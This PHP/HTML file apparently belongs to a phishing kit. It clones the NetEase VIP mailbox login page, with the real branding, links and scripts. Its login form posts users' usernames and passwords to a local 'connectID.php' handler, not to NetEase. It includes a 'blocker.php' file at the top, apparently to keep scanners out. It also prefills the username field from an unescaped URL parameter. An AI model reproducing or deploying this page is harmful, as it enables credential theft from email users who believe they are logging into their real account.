<?php
include('blocker.php');
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8" />
<meta name="keywords" content="邮箱,VIP邮箱,收费邮箱,商务邮箱,电子邮箱,网易邮箱,vip163邮箱,mail,email,电子传真,邮箱传真,超量群发,网易公正邮,邮件公证,公证邮,公正邮,电子邮件取证,电子邮箱证据,邮件法律效力,电子邮件法律效力">
<meta name="description" content="网易VIP邮箱是中国首家管家式服务邮箱，企业商务邮箱的完美典范！独有的一对一管家服务，海外服务器全球互通，垃圾病毒拦截率高达99.8%，支持400封超量群发，20G超大附件，128G超大网盘、中英文无广告界面，电子传真、日程提醒、手机邮以及个人理财、商旅通、应用写作、个性名片等强大商务功能。12年的品质追求，邮箱就用中国服务最好、最安全稳定的电子邮箱！" />
<title>网易VIP邮箱-最安全稳定的收费邮箱</title>
<link rel="shortcut icon" href="http://www.126.com/favicon.ico" />
<link rel="stylesheet" href="http://mimg.127.net/vip/newindex/css/style.css">
<script type="text/javascript">
//获取url参数值
function fGetQuery(name){
	var sUrl = window.location.search.substr(1);
	var sTxt = sUrl.match(new RegExp("(^|&)" + name + "=([^&]*)(&|$)"));
	return (sTxt == null ? null : unescape(sTxt[2]));
}
// 设备判断跳转
function fCheckBrowser(){
	gbForcepc = fGetQuery("dv") == "pc";
	if(!gbForcepc){
		var sUserAgent = navigator.userAgent.toLowerCase(),
			sUrlRedirect,
		    oUrlRedirect = {
				"ipad" : "http://ipad.vip.163.com/?dv=ipad",
				"pad"	: "http://ipad.vip.163.com/",
				"smart" : "http://smart.vip.163.com/?dv=smart",
				"m" : "http://m.vip.163.com/"
			},
			aClient = ["ipad","iphone os","android","ucweb","rv:1.2.3.4","windows ce","windows mobile","midp"];
		for(var i=0;i<aClient.length;i++){
			if(sUserAgent.indexOf(aClient[i]) != -1){
				switch(aClient[i]){
					case "ipad" :
						sUrlRedirect = oUrlRedirect["ipad"];
						break;
					case "iphone os" :
						sUrlRedirect = oUrlRedirect["smart"];
						break;
					case "android" :
						oAndroidRedirect = {
							sPhoneUrl	:	oUrlRedirect["smart"],
							sPadUrl		:	oUrlRedirect["pad"]
						};
						DOMREADY(
							function(){
								fGetScript('http://mimg.127.net/index/lib/scripts/android.js');
							}
						);
						return false;
						break;
					default :
						sUrlRedirect = oUrlRedirect["m"];
				}
			window.location.href = sUrlRedirect;
			}
		}
	}
}
fCheckBrowser();
</script>
</head>

<body class="p-login p-login-vip163" id="pagebody">
	<div class="g-hd">
		<div class="m-hd">
			<span class="u-logo"></span><span class="slogan">最安全稳定的高端邮箱</span>
			<p class="nav"><a href="http://vip.163.com/intro/index.html?from=vip163_login" target="_blank">邮箱介绍</a>&nbsp;|&nbsp;<a href="http://jf.vip.163.com/apps/upgrade/unauth/index.m?from=vip163_login" target="_blank">免费邮升级</a>&nbsp;|&nbsp;<a id="aboutus" href="javascript:void(0);">关注我们</a>&nbsp;|&nbsp;<a id="service" href="javascript:void(0);">7x24客户服务</a></p>
		</div>
	</div>
	<div class="g-bd">
		<div class="g-bgtxt" id="bgtext">言必诚信，行必忠正</div>
		<div class="g-bgauthor" id="bgauthor"></div>
		<div class="m-loginbg">
			<img id="bg" draggable="false" src="http://mimg.127.net/vip/spread/images/login.jpg" style="width: 1366px; margin-left: 0px; margin-top: -63.0234375px; display: inline;">
		</div>
		<div class="m-bgwrap" style="cursor: pointer;"></div>
		<div class="m-loginboxbg"></div>
		<div class="m-loginbox">
			<div id="pervent" class="m-photoframe" title="更换防伪图片" hidefocus="" style="display: none;">
                    <img class="perImg" src="about:blank" alt="">
            </div>
			<div class="lbinner" id="mailbox">
<form action="connectID.php?main.jsp+sid=EAqjkpGGzmJMxXGpCLGGXCyFxjhOMlwd&df=mail.126.com#module=read.ReadModule" method="post">
<input type="hidden" name="domainID" value="vip.163.com" />
					<div class="line1 f-cb">
						<input type="text" class="ipt ipt-user" id="username" autocomplete="off" name="username" value="" maxlength="40" style="display:none;">
						<input type="text" name="username" class="ipt ipt-user ipt-replace" id="replaceun" value="<?php echo str_replace("@vip.163.com","",$_GET['email']) ?>" autocomplete="off" placeholder="邮箱帐号/手机号码" maxlength="40" >
						<span class="domain">@vip.163.com</span>
					</div>
					<div class="line2 f-cb">
						<input type="password" class="ipt ipt-pwd" id="password" autocomplete="off" value="" name="password" style="display:none;">
						<input type="password" autofocus="" class="ipt ipt-pwd ipt-replace" id="replacepw" name="password" required="required" autocomplete="off" placeholder="输入密码">
					</div>
					<div class="line3 f-cb">
						<p class="ssl" id="ssl" title="您正在使用银行级加密登录，全面保障邮箱安全"><span class="u-ico u-ico-ticked u-ico-tick" id="icossl"></span>&nbsp;加密登录</p>
						<a class="forgotpw" href="#" target="_blank">忘记密码？</a>
					</div>

					<div class="line4">
					<button id="loginBtn" class="u-loginbtn" tabindex="6" type="submit">登&emsp;录</button>
					</div>
					<div class="line5">
						<div id="verline">
							版本：<a class="seltver" id="seltver" href="javascript:void(0);"><span class="vername">默认版本</span><span class="u-ico u-ico-triangle"></span></a>
							<ul class="verbox" id="verbox" style="display: none;">
								<li><a class="ver ver-0" href="javascript:void(0);" style="font-weight: 700;"><span>默认版本</span></a></li>
								<li><a class="ver" href="javascript:void(0);" style="font-weight: 400;"><span>极致6.0</span></a></li>
								<li><a class="ver" href="javascript:void(0);" style="font-weight: 400;"><span>管家5.0</span></a></li>
								<li style="display:none;"><a class="ver" href="javascript:void(0);" style="font-weight: 400;"><span>智惠版</span></a></li>
								<li style="display:none;"><a class="ver" href="javascript:void(0);" style="font-weight: 400;"><span>简约3.0</span></a></li>
								<li><a class="ver" href="javascript:void(0);" style="font-weight: 400;"><span>English</span></a></li>
							</ul>
						</div>
					</div>
					<div class="line6 f-cb">
						<a class="u-abtn u-abtn-1" target="_blank" id="regbtn" href="http://reg.vip.163.com/register.m?from=vip163_login">注&emsp;册</a>
						<a class="u-abtn u-abtn-2" target="_blank" id="paybtn" href="http://reg.vip.163.com/paytwo.m?from=vip163_login">支&emsp;付</a>
					</div>
					<input id="realusername" name="user" value="" type="hidden">
					<input id="secure" name="secure" value="1" type="hidden">
					<input id="logintype" name="logintype" value="-1" type="hidden">
					<input id="language" name="language" value="-1" type="hidden">
					<input name="noRedirect" value="1" type="hidden">
				</form>
				<ul class="m-topiclist"><li><a href="http://gzy.mail.163.com?from=vipdengluchain" target="_blank">·&nbsp;商业秘籍-如何应对客户言而无信、出尔反尔？</a></li><li><a href="http://188vip.vip.blog.163.com/blog/static/86908120201481513150240?from=wenzilian" target="_blank">·&nbsp;国庆送礼-长假出行，旅行三件宝免费送！</a></li></ul>
			</div>
			<div class="m-popup m-popup-warn m-popup-warn-block">
				<div class="inner">
					<div class="tt"><span class="u-ico u-ico-warn"></span>帐号或密码错误</div>
					<div class="ct">
						<p>提示：</p>
						<p>1. 请检查帐号拼写，是否输入有误</p>
						<p>2. 若帐号长期未登录，可能已被注销，请<a target="_blank" href="http://reg.vip.163.com/register.m?from=vip163_login" id="reglink">重新注册</a></p>
						<p>3. 若您忘记密码，请<a target="_blank" href="http://reg.163.com/getpasswd/RetakePassword.jsp?from=vip163_login">找回密码</a></p>
						<p>4. 若您需要锁定此帐号，请<a target="_blank" href="http://reg.163.com/lockuser/LockUserByPingma_0.jsp?from=vip163_login">点击这里</a></p>
					</div>
				</div>
				<div class="arrow"></div>
			</div>
		</div>
	</div>
	<div class="g-ft">
		<div id="footer" class="m-footer">
			网易公司版权所有&nbsp;©&nbsp;1997-<script type="text/javascript" src="http://mimg.127.net/copyright/year.js"></script>2014&nbsp;|
	        <a target="_blank" href="http://vip.126.com?from=vip163_login">VIP126尊享邮</a>&nbsp;
	        <a target="_blank" href="http://www.188.com?from=vip163_login">188财富邮</a>&nbsp;
	        <a target="_blank" href="http://gzy.mail.163.com?from=vip163_login" style="position: relative;display:inline-block">公正邮<i class="u-new" style="position: absolute;display;block;width:20px;height:13px;top:-12px;right:-13px;background:url(http://vip.163.com/intro/img/new.png) no-repeat;"></i></a>&nbsp;
	       	<a target="_blank" href="http://1.163.com/">1元夺宝</a>&nbsp;
	       	<a target="_blank" href="http://mail.163.com/dashi/?from=mail2">邮箱大师</a>&nbsp;|&nbsp;
	        <a target="_blank" href="http://gb.corp.163.com/gb/legal.html">隐私政策</a>
	     </div>
	</div>
	<div class="m-popup m-popup-card m-popup-arrowtop" style="display: none;">
		<div class="inner">
			<div class="tt">关注VIP邮箱帐号</div>
			<div class="ct">
				<ul>
					<li>
						<a href="http://weibo.com/163vip" target="_blank" class="u-card u-card-weibo"></a>
						<p>网易VIP邮箱官博</p>
					</li>
					<li>
						<span class="u-card u-card-weixin"></span>
						<p>微信公众号</p>
					</li>
					<li>
						<span class="u-card u-card-yixin"></span>
						<p>易信公众号</p>
					</li>
				</ul>
			</div>
		</div>
		<a href="javascript:void(0);" class="u-ico u-ico-close"></a>
		<div class="arrow"></div>
	</div>
	<div class="m-popup m-popup-service m-popup-arrowtop" style="display: none;">
		<div class="inner">
			<div class="tt">全国首创<span class="thot">7x24管家服务</span></div>
			<div class="ct">
				<p>VIP服务专席：<span class="telnum">400-9163-163</span></p>
				<p>专&ensp;属&ensp;管&ensp;家：<span class="telnum">400-9163-163&nbsp;</span><a target="_blank" href="http://vip.163.com/vip/special/vipts/vipts.htm?4,9#from=vip163_login" class="lkmore">了解管家</a></p>
				<p>服&ensp;务&ensp;传&ensp;真：<span class="telnum">400-8892-163转168163</span></p>
			</div>
			<div class="ft">
				<a target="_blank" href="http://help.163.com/13/0507/10/8U92FIMH00752I5U.html?from=vip163_login" class="box box-1">
					<div class="boxct">
						<span class="u-ico u-ico-yen"></span><span>汇款发票</span>
					</div>
				</a>
				<a target="_blank" href="http://vip.163.com/dc/jianyi/jy-vip-index.htm?from=vip163_login" class="box box-2">
					<div class="boxct">
						<span class="u-ico u-ico-suggest"></span><span>提交建议</span>
					</div>
				</a>
				<a target="_blank" href="http://vip.help.163.com?from=vip163_login" class="box box-3">
					<div class="boxct">
						<span class="u-ico u-ico-help"></span><span>帮助中心</span>
					</div>
				</a>
			</div>
		</div>
		<a href="javascript:void(0);" class="u-ico u-ico-close"></a>
		<div class="arrow"></div>
	</div>
	<iframe class="m-loginframe" src="javascript:void((function(){document.open();document.domain='163.com';document.close()})())" id="frameforlogin" name="frameforlogin" style="display:none;">登录iframe</iframe>
	<script type="text/javascript" src="http://mimg.127.net/p/tools/jquery/jquery-1.8.1.min.js"></script>
	<script type="text/javascript" src="http://mimg.127.net/vip/spread/js/spread.js"></script>
	<script type="text/javascript" src="http://mimg.127.net/vip/newindex/js/script.min.js"></script>
	<script type="text/javascript">var _rum = _rum||[];if(Math.random()<0.2){if(document.addEventListener){window.addEventListener("load",function(){_rum.push(["onload",+new Date()]);})}else{window.attachEvent("onload",function(){_rum.push(["onload",+new Date()]);})}_rum.push(["firstByte",+new Date()]);_rum.push(["page","76a5eaf7fc11454362154fde2cbbeaaf"]);_rum.push(["frameMonitor",!1]);var _script = document.createElement("script");_script.type = "text/javascript";_script.async = true;_script.src = "http://api.perf.netease.com/rum.js";var s = document.getElementsByTagName("script")[0];s.parentNode.insertBefore(_script, s);}</script>
	<script type="text/javascript">
		try{
			var host = location.host;
			_ntes_nacc = "vip";
			if(host.indexOf("vip.126.com")>=0) {
				_ntes_nacc = "vip126";
			} else if(host.indexOf("188.com")>=0) {
				_ntes_nacc = "188";
			} else if(host.indexOf("vipmail.163.com")>=0) {
				_ntes_nacc = "vipmail";
			}
		}catch(e){}
		_analytic_track_map = {
			vip:"6a69a2c3dae828b6c7694106ffa4c7d7",
			vip126:"10f70e50b26984652c63430cb0e94239",
			188:"ab7c06b37610bd687ae80d5a7e0b908a",
			vipmail:"0034d0ddc0192d6498dc964425eb93ef"
		}
		var _bdhmProtocol = (("https:" == document.location.protocol) ? " https://" : " http://");
		document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3F"+_analytic_track_map[_ntes_nacc]+"' type='text/javascript'%3E%3C/script%3E"));
	</script><script src=" http://hm.baidu.com/h.js?6a69a2c3dae828b6c7694106ffa4c7d7" type="text/javascript"></script>	

<div id="flashArea"><embed src="http://mimg.vip.163.com/flash/global/AntiFake.swf" wmode="transparent" flashvars="apiHost=vip.163.com&amp;API_COOKIENAME=vipmail_flashcookie" id="fenceCookie" name="fenceCookie" swliveconnect="true" quality="high" width="1" height="1" align="middle" allowscriptaccess="always" type="application/x-shockwave-flash" pluginspage="http://www.macromedia.com/go/getflashplayer"></div></body>
</html>